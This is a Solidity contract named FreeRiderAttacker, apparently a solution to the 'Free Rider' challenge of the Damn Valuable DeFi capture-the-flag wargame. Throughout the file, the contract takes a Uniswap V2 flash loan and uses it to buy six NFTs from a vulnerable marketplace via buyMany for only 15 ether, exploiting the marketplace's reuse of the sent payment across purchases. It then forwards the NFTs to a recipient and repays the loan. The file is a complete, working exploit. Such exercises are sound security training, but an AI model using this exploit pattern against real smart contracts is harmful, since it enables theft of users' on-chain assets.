// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

interface IWETH {
    function withdraw(uint wad) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderAttacker is IUniswapV2Callee, ERC721Holder {
    address private immutable owner;
    address private immutable recipient;
    IUniswapV2Pair private uniswapV2Pair;
    FreeRiderNFTMarketplace private marketplace;
    DamnValuableNFT private nft;

    constructor(
        address _recipient, 
        address _uniswapV2Pair, 
        address _marketplace, 
        address _nft
    ) {
        owner = msg.sender;
        recipient = _recipient;
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        marketplace = FreeRiderNFTMarketplace(payable (_marketplace));
        nft = DamnValuableNFT(_nft);
    }

    function uniswapV2Call(
        address, 
        uint, 
        uint, 
        bytes calldata data
    ) external override {
        require(msg.sender == address(uniswapV2Pair), "Callback not triggered by UniswapV2Pair");

        // Calculate amount to pay back
        (address token0, uint256 borrowAmount) = abi.decode(data, (address, uint));
        uint256 fee = ((borrowAmount * 3) / 997) + 1;
        uint256 amountToRepay = borrowAmount + fee;

        // Convert WETH to ETH
        IWETH weth = IWETH(token0);
        weth.withdraw(borrowAmount);

        // Execute the buy order
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 tokenId=0; tokenId<6; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        marketplace.buyMany{value: 15 ether}(tokenIds);

        // Transfer NFTs to recipient
        for (uint256 tokenId=0; tokenId < tokenIds.length; tokenId++) {
            nft.safeTransferFrom(address(this), recipient, tokenId);
        }

        // Convert ETH to WETH
        weth.deposit{value: amountToRepay}();

        // Return the borrowed WETH to uniswap pool
        weth.transfer(address(uniswapV2Pair), amountToRepay);
    }

    function executeFlashLoan(uint256 amount) public {
        bytes memory data = abi.encode(uniswapV2Pair.token0(), amount);
        uniswapV2Pair.swap(amount, 0, address(this), data);
    }
    
    receive() external payable {}
}
